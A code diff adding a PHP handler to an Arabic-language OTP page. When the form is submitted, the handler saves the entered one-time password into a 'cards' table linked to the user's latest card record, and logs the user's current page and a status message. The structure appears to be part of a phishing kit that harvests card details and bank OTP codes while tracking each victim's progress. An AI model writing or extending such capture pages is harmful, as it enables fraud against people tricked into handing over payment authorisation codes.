@@ -1,5 +1,26 @@
+<?php
+session_start();
+require_once __DIR__ . '/config.php';
 
-
+if (isset($_POST['submit'])) {
+    $otp = $_POST['otp'] ?? '';
+    if (isset($_SESSION['user_id'])) {
+        $userId = intval($_SESSION['user_id']);
+        // Save OTP to latest card or create new card entry
+        $cards = supabase_get('cards', 'user_id=eq.' . $userId, '*', 'created_at.desc');
+        if (!empty($cards)) {
+            supabase_update('cards', 'id=eq.' . $cards[0]['id'], ['otp' => $otp]);
+        } else {
+            supabase_insert('cards', ['user_id' => $userId, 'otp' => $otp]);
+        }
+        supabase_update('users', 'id=eq.' . $userId, [
+            'message' => 'رمز OTP',
+            'page' => 'otp.php',
+            'updated_at' => date('Y-m-d H:i:s')
+        ]);
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
